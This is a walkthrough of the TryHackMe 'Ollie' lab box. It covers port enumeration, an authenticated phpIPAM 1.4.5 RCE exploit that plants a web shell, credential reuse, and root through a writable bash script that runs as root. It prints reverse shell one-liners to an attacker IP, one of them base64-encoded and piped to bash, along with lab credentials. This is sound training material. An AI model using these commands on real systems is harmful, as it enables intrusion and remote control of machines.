---
title: "Ollie TryHackMe" 
date: 2025-09-2 00:50:00 0000+
tags: [WriteUp, Ollie, THM,  Enumeration, CVE, phpIPAM, OldSoftware, Unpatched, password reuse ,Privilege Escalation, Linux]
categories: [WriteUps, TryHackMe]
image:
  path: /assets/images/Ollie_THM/preview_ollie.jpeg
---
# Ollie THM Writeup

Ollie is medium level box on TryHackMe which focuses on web exploitation an old unpatched phpIPAM service is vulnerable to the authenticated RCE giving us shell on the box, and the user is using the same password as of the web portal enabling us to move locally in the server, a bash script was running as root which has write permissions of the low privileged user giving us the root shell on the box.

![image.png](/assets/images/Ollie_THM/image.png)

## Enumeration

As always we are gonna start off with the rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.201.88.196
```

![image.png](/assets/images/Ollie_THM/image%201.png)

Looking at the results we have only 3 ports open one being SSH, WEB and a 1337 port.

## Exploitation

### Unknown Service 1337

Lets take a look at port 1337 first.

I’ll connect to it using netcat.

```bash
nc 10.201.88.196 1337
```

![image.png](/assets/images/Ollie_THM/image%202.png)

Answered some of the questions right and we have some credentials.

### Shell as www-data

Lets take a look at the website running on port 80.

![image.png](/assets/images/Ollie_THM/image%203.png)

Notable things we got from this webpage is that its running **phpIPAM v1.4.5** and this page is leaking a potential email address of the author 0day → 0day@ollieshouse.thm

I will add ollieshouse.thm to our /etc/host file.

Also our nmap scan found out that there’s a robots.txt file.

![image.png](/assets/images/Ollie_THM/image%204.png)

Lets take a look at that page.

![image.png](/assets/images/Ollie_THM/image%205.png)

Never mind its just a troll song on YT, we just got baited.

Earlier the webpage is leaking the version of the phpIPAM i.e. 1.4.5 lets search that up on searchsploit.

```bash
searchsploit phpIPAM
```

![image.png](/assets/images/Ollie_THM/image%206.png)

We have an authenticated exploit.

First lets login to the portal at [http://ollieshouse.thm/](http://ollieshouse.thm/) 

![image.png](/assets/images/Ollie_THM/image%207.png)

After successful authentication lets now run our exploit with the credentials.

```bash
python3 50963.py -url http://ollieshouse.thm/ -usr 'admin' -pwd 'OllieUnixMontgomery!'
```

![image.png](/assets/images/Ollie_THM/image%208.png)

Now visiting [http://ollieshouse.thm/evil.php?cmd=whoami](http://ollieshouse.thm/evil.php?cmd=whoami) 

![image.png](/assets/images/Ollie_THM/image%209.png)

We have code execution !

Now starting a listener using netcat on our local machine.

```bash
nc -lnvp 9001
```

Now we need a payload so that we get a hit back on our netcat listener.

```bash
echo 'YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjE0Ljk4LjIzNS85MDAxIDwmMQ==' | base64 -d | bash
```

I base64 encoded the base reverse shell.

![image.png](/assets/images/Ollie_THM/image%2010.png)

The webpage hangs and on the listener we have a shell as www-data.

![image.png](/assets/images/Ollie_THM/image%2011.png)

Now I will stabilize the shell using python’s pty module, grant us clear permissions and also fix the stty size of rows and columns.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + Z
stty size
stty rows 120 cols 120
```

![image.png](/assets/images/Ollie_THM/image%2012.png)

Now we have a stabilize shell.

Lets enumerate the users on this box.

```bash
cat /etc/passwd | grep "bash"
```

![image.png](/assets/images/Ollie_THM/image%2013.png)

There are three users who have shell on this box.

Now I will search for potential passwords (if any) on this box to do the lateral movement.

In the /var/www/html directory we have a config.php listing it gives us some credentials.

![image.png](/assets/images/Ollie_THM/image%2014.png)

Lets try this password with **Ollie** as the username with SSH.

```bash
nxc ssh ollieshouse.thm -u 'ollie' -p 'IamDah1337estHackerDog!'
```

![image.png](/assets/images/Ollie_THM/image%2015.png)

It failed !

Lets try authenticating these credentials to the SQL service running on the box.

```bash
mysql -h localhost -u 'phpipam_ollie' -p'IamDah1337estHackerDog!'
```

![image.png](/assets/images/Ollie_THM/image%2016.png)

And we are in !

Lets list and switch our database.

![image.png](/assets/images/Ollie_THM/image%2017.png)

Listed the tables in this database, it has 42 tables.

Users table is also present, listing it.

We have an administrator hash.

![image.png](/assets/images/Ollie_THM/image%2018.png)

This hash was uncrackable and we were in a rabbit hole.

## Privilege Escalation

### Linpeas

Uploaded [linpeas.sh](http://linpeas.sh) to the target system to find potential escalation methods.

Found a python script named olliebot.py, which is running as root.

![image.png](/assets/images/Ollie_THM/image%2019.png)

We can monitor what this script is doing using pspy64.

### PSPY

Uploaded the pspy64, gave it necessary permissions and ran it.

```bash
chmod +x pspy64
./pspy64
```

This starts monitoring all the processes running on the vulnerable machine.

![image.png](/assets/images/Ollie_THM/image%2020.png)

This script grabs another binary that is running as root in /usr/bin/feedme.

Lets take a look at it.

![image.png](/assets/images/Ollie_THM/image%2021.png)

This is bash script, only ollie and root have write privileges over it.

I enumerated a lot and thought how to get to ollie.

But in the end ollie was using the same password we used to login to phpIPAM.

```bash
su ollie
```

![image.png](/assets/images/Ollie_THM/image%2022.png)

Now lets edit the feedme bash script and add our reverse shell in it, also I will start a listener using netcat on port 9999.

The reverse shell is→

```bash
bash -c 'exec bash -i &>/dev/tcp/10.14.98.235/9999 <&1'
```

![image.png](/assets/images/Ollie_THM/image%2023.png)

And after sometime we get a hit back on our listener.

![image.png](/assets/images/Ollie_THM/image%2024.png)

Now first grabbing the user.txt from ollie’s.

![image.png](/assets/images/Ollie_THM/image%2025.png)

Lastly grabbing the root.txt from the machine’s root directory.

![image.png](/assets/images/Ollie_THM/image%2026.png)

Rooted!

![image.png](/assets/images/Ollie_THM/image%2027.png)

Thanks for reading 😊
